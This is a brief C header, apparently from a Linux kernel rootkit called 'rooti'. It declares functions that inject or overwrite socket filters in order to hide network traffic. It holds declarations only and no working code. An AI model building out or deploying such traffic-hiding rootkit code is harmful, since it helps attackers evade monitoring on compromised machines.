#ifndef _ROOTI_HIDING_TRAFFIC_H
#define _ROOTI_HIDING_TRAFFIC_H

int rooti_inject_traffic_filter(struct sock *sock, struct sock_fprog *user_fprog);
int rooti_overwrite_traffic_filter(struct sock *sock);

#endif